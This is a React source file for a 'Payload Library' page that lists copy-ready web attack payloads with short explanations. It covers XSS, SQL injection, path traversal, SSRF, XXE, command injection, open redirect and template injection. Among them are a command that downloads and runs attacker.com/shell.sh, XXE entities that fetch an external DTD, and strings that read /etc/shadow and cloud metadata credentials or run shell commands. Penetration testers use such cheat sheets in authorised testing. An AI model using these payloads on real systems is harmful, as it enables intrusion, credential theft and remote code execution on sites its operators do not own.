import React, { useState } from 'react';
import { Zap, Copy, Check, Search, Info } from 'lucide-react';

const PAYLOAD_DB = [
  {
    cat: 'XSS — Basic',
    desc: 'Cross-Site Scripting (XSS) tricks a website into running your JavaScript code in another user\'s browser. The attacker can steal cookies, session tokens, or redirect users to phishing pages. These basic payloads work when input is reflected directly into HTML with no filtering.',
    example: 'Enter <script>alert(1)</script> into a search box. If a popup appears, the site is vulnerable.',
    payloads: [
      '<script>alert(1)</script>',
      `<img src=x onerror=alert(1)>`,
      `<svg onload=alert(1)>`,
      `"><script>alert(document.domain)</script>`,
      `'><img src=x onerror=prompt(1)>`,
      `javascript:alert(1)`,
      `<body onload=alert(1)>`,
      `<iframe src="javascript:alert(1)">`,
      `<input autofocus onfocus=alert(1)>`,
      `<details open ontoggle=alert(1)>`,
    ],
  },
  {
    cat: 'XSS — Filter Bypass',
    desc: 'When a site blocks basic XSS, attackers use tricks to evade the filter. This includes mixed case (ScrIpT), HTML entities (&lt;), URL encoding (%3C), nested tags, and base64-encoded payloads. WAFs and simple blacklist filters often miss these.',
    example: 'If <script> is blocked, try <ScRiPt> — many filters are case-sensitive and only block lowercase.',
    payloads: [
      `<ScRiPt>alert(1)</sCrIpT>`,
      `<script>alert\`1\`</script>`,
      `<img src=1 href=1 onerror="javascript:alert(1)">`,
      `<svg><script>alert&#40;1&#41;</script>`,
      `%3Cscript%3Ealert(1)%3C/script%3E`,
      `&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;`,
      `<scr<script>ipt>alert(1)</scr</script>ipt>`,
      `"><img src=x:x onerror=eval(atob('YWxlcnQoMSk='))>`,
      `<a href="data:text/html,<script>alert(1)</script>">click</a>`,
    ],
  },
  {
    cat: 'XSS — DOM Based',
    desc: 'DOM-based XSS happens when JavaScript in the page reads user-controlled data (like URL fragments or localStorage) and writes it to the DOM without sanitizing. The server never sees the payload — it\'s executed entirely in the browser by the page\'s own code.',
    example: 'A page reads location.hash and writes it to innerHTML. Visiting page.html#<script>alert(1)</script> triggers the attack.',
    payloads: [
      `#<script>alert(1)</script>`,
      `#"><img src=x onerror=alert(1)>`,
      `javascript:void(document.domain)`,
      `?q=<script>alert(document.cookie)</script>`,
    ],
  },
  {
    cat: 'SQL Injection — Detection',
    desc: 'SQL Injection lets an attacker insert SQL commands into a query. Detection payloads look for error messages, unexpected results, or changes in behavior when SQL syntax is injected into form fields, URL params, or headers. A single quote \' is the classic first probe.',
    example: 'Enter \' into a login form. If you see a database error like "syntax error near \'\'" the site is injectable.',
    payloads: [
      `'`,
      `''`,
      `'--`,
      `' OR '1'='1`,
      `' OR 1=1--`,
      `" OR 1=1--`,
      `') OR ('1'='1`,
      `1; DROP TABLE users--`,
      `1 UNION SELECT NULL--`,
      `1 UNION SELECT NULL,NULL--`,
      `admin'--`,
      `' OR 'x'='x`,
    ],
  },
  {
    cat: 'SQL Injection — Data Extraction',
    desc: 'Once injection is confirmed, UNION SELECT lets you read other database tables. You can extract usernames, passwords, emails, and even read server files. The column count and types must match the original query — that\'s why NULL is used to find the right count first.',
    example: 'If the original query selects 2 columns, use UNION SELECT username,password FROM users-- to read the users table.',
    payloads: [
      `' UNION SELECT username,password FROM users--`,
      `' UNION SELECT table_name,NULL FROM information_schema.tables--`,
      `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--`,
      `1 AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='admin')='a'`,
      `'; EXEC xp_cmdshell('whoami')--`,
      `1; SELECT * FROM users INTO OUTFILE '/var/www/html/users.txt'`,
    ],
  },
  {
    cat: 'LFI / Path Traversal',
    desc: 'Local File Inclusion (LFI) lets you read files on the server\'s filesystem. Path traversal uses ../ sequences to navigate up directories and reach sensitive files like /etc/passwd (Linux user list) or config files with passwords. PHP wrappers like php://filter can also leak source code.',
    example: 'If the URL is page.php?file=home, try page.php?file=../../../etc/passwd to read the Linux user list.',
    payloads: [
      `../../../etc/passwd`,
      `../../../../etc/passwd`,
      `..%2F..%2F..%2Fetc%2Fpasswd`,
      `....//....//....//etc/passwd`,
      `/etc/passwd%00`,
      `php://filter/convert.base64-encode/resource=/etc/passwd`,
      `php://input`,
      `expect://id`,
      `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=`,
      `file:///etc/passwd`,
      `../../../../etc/shadow`,
      `../../windows/system32/drivers/etc/hosts`,
    ],
  },
  {
    cat: 'SSRF',
    desc: 'Server-Side Request Forgery (SSRF) tricks the server into making HTTP requests on your behalf — often to internal systems the attacker can\'t reach directly. Cloud metadata endpoints (169.254.169.254) expose AWS/GCP credentials. SSRF can reach internal APIs, admin panels, and databases.',
    example: 'If a site fetches external URLs (for previews/webhooks), try supplying http://169.254.169.254/latest/meta-data/ to read AWS cloud metadata.',
    payloads: [
      `http://169.254.169.254/latest/meta-data/`,
      `http://169.254.169.254/latest/user-data/`,
      `http://metadata.google.internal/computeMetadata/v1/`,
      `http://192.168.0.1`,
      `http://localhost:22`,
      `http://[::1]:80`,
      `http://0177.0.0.1/`,
      `http://2130706433/`,
      `http://0x7f000001/`,
      `gopher://127.0.0.1:6379/_PING`,
      `dict://127.0.0.1:6379/info`,
    ],
  },
  {
    cat: 'XXE',
    desc: 'XML External Entity (XXE) injection abuses XML parsers that allow external entity references. By defining an entity that points to a local file or internal URL, you can read /etc/passwd, trigger SSRF, or cause denial of service. Affects any endpoint that accepts XML input.',
    example: 'Send an XML body with an entity defined as SYSTEM "file:///etc/passwd". If the response includes the file contents, the parser is vulnerable.',
    payloads: [
      `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>`,
      `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><root>&xxe;</root>`,
      `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>`,
      `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>`,
    ],
  },
  {
    cat: 'Command Injection',
    desc: 'Command injection happens when user input is passed to a system shell without sanitization. By appending shell operators (;, |, &&) followed by commands, you can run arbitrary commands on the server. Target: apps that call ping, nslookup, or file utilities with user input.',
    example: 'A network tool runs: ping {user_input}. Supplying "8.8.8.8; whoami" would ping Google AND run whoami on the server.',
    payloads: [
      `; ls`,
      `| ls`,
      `&& ls`,
      `|| ls`,
      '`ls`',
      `$(ls)`,
      `; cat /etc/passwd`,
      `| cat /etc/passwd`,
      `\n ls`,
      `%0a ls`,
      `; ping -c 1 attacker.com`,
      `| wget http://attacker.com/shell.sh -O /tmp/s && chmod +x /tmp/s && /tmp/s`,
    ],
  },
  {
    cat: 'Open Redirect',
    desc: 'Open Redirect happens when a site uses a user-controlled URL parameter to redirect after login/logout. Attackers use this to redirect victims to phishing sites while making the initial link look legitimate (same trusted domain). Also used to bypass security filters that check for a specific host.',
    example: 'Login redirects to: bank.com/login?next=/dashboard. Changing next=https://evil.com sends victims to a phishing site after login.',
    payloads: [
      `//attacker.com`,
      `https://attacker.com`,
      `/\\attacker.com`,
      `//attacker.com/%2F..`,
      `https:attacker.com`,
      `%0d%0aLocation: https://attacker.com`,
      `////attacker.com`,
      `javascript:alert(document.domain)`,
    ],
  },
  {
    cat: 'SSTI (Server-Side Template Injection)',
    desc: 'SSTI happens when user input is placed inside a server-side template (Jinja2, Twig, Freemarker) and evaluated. The payload {{7*7}} is the classic probe — if the page shows 49, you have injection. From there, attackers can access Python/Java internals and achieve Remote Code Execution (RCE).',
    example: 'A site shows "Hello, {name}!" If you enter "{{7*7}}" as your name and see "Hello, 49!", the template engine is evaluating your input.',
    payloads: [
      `{{7*7}}`,
      `${7*7}`,
      `<%= 7*7 %>`,
      `#{7*7}`,
      `{{config}}`,
      `{{''.__class__.__mro__[1].__subclasses__()}}`,
      `{% for x in [].class.base.subclasses() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}`,
      `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`,
    ],
  },
];

function CopyBtn({ text }: { text: string }) {
  const [c, setC] = useState(false);
  return (
    <button onClick={() => { navigator.clipboard.writeText(text); setC(true); setTimeout(() => setC(false), 1500); }}
      className="p-1 text-muted-foreground hover:text-primary transition-colors shrink-0">
      {c ? <Check size={11} className="text-green-400" /> : <Copy size={11} />}
    </button>
  );
}

export default function Payloads() {
  const [search, setSearch] = useState('');
  const [active, setActive] = useState<string | null>(null);
  const [expandedInfo, setExpandedInfo] = useState<string | null>(null);

  const filtered = PAYLOAD_DB.map(cat => ({
    ...cat,
    payloads: cat.payloads.filter(p => !search || p.toLowerCase().includes(search.toLowerCase())),
  })).filter(cat => !search || cat.payloads.length > 0 || cat.cat.toLowerCase().includes(search.toLowerCase()));

  const display = active ? filtered.filter(c => c.cat === active) : filtered;

  return (
    <div className="flex-1 overflow-y-auto p-4 md:p-8 font-mono">
      <div className="max-w-5xl mx-auto space-y-5">
        <header className="space-y-1">
          <h1 className="text-2xl font-bold flex items-center gap-2 text-primary"><Zap size={22} /> Payload Library</h1>
          <p className="text-muted-foreground text-xs">XSS, SQLi, LFI, SSRF, XXE, SSTI — click the info icon to understand how each attack works. Click to copy payloads.</p>
        </header>

        <div className="flex flex-wrap gap-2 items-center">
          <div className="flex items-center gap-2 bg-card border border-border rounded px-3 py-2 flex-1 min-w-48">
            <Search size={13} className="text-muted-foreground" />
            <input value={search} onChange={e => setSearch(e.target.value)} placeholder="Search payloads…"
              className="bg-transparent text-sm outline-none w-full font-mono" />
          </div>
          <div className="flex flex-wrap gap-1">
            <button onClick={() => setActive(null)}
              className={`text-[10px] px-2 py-1 rounded border tracking-wider transition-colors ${!active ? 'border-primary/50 text-primary bg-primary/10' : 'border-border text-muted-foreground hover:text-foreground'}`}>
              ALL
            </button>
            {PAYLOAD_DB.map(c => (
              <button key={c.cat} onClick={() => setActive(active === c.cat ? null : c.cat)}
                className={`text-[10px] px-2 py-1 rounded border tracking-wider transition-colors whitespace-nowrap ${active === c.cat ? 'border-primary/50 text-primary bg-primary/10' : 'border-border text-muted-foreground hover:text-foreground'}`}>
                {c.cat.split('—')[0].trim()}
              </button>
            ))}
          </div>
        </div>

        <div className="space-y-4">
          {display.map(cat => (
            <div key={cat.cat} className="bg-card/50 border border-border rounded-lg overflow-hidden">
              <div className="px-4 py-2.5 border-b border-border bg-black/20 flex items-center justify-between">
                <span className="text-xs font-bold text-primary tracking-widest uppercase">{cat.cat}</span>
                <div className="flex items-center gap-3">
                  <span className="text-muted-foreground text-[10px] font-normal">{cat.payloads.length} payloads</span>
                  <button onClick={() => setExpandedInfo(expandedInfo === cat.cat ? null : cat.cat)}
                    className="text-muted-foreground hover:text-primary transition-colors"
                    title="What is this attack?">
                    <Info size={13} />
                  </button>
                </div>
              </div>

              {expandedInfo === cat.cat && (
                <div className="px-4 py-3 border-b border-border bg-black/10 space-y-2">
                  <p className="text-xs text-muted-foreground leading-relaxed">{cat.desc}</p>
                  {cat.example && (
                    <div className="flex items-start gap-2 text-[11px] text-primary/70 bg-black/20 rounded px-3 py-2 border border-border/50">
                      <span className="text-primary font-bold shrink-0">Example:</span>
                      <span>{cat.example}</span>
                    </div>
                  )}
                </div>
              )}

              <div className="divide-y divide-border/50">
                {cat.payloads.map((p, i) => (
                  <div key={i} className="flex items-start gap-2 px-4 py-2.5 hover:bg-secondary/20 transition-colors group">
                    <code className="flex-1 text-[11px] text-primary/90 break-all whitespace-pre-wrap">{p}</code>
                    <CopyBtn text={p} />
                  </div>
                ))}
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
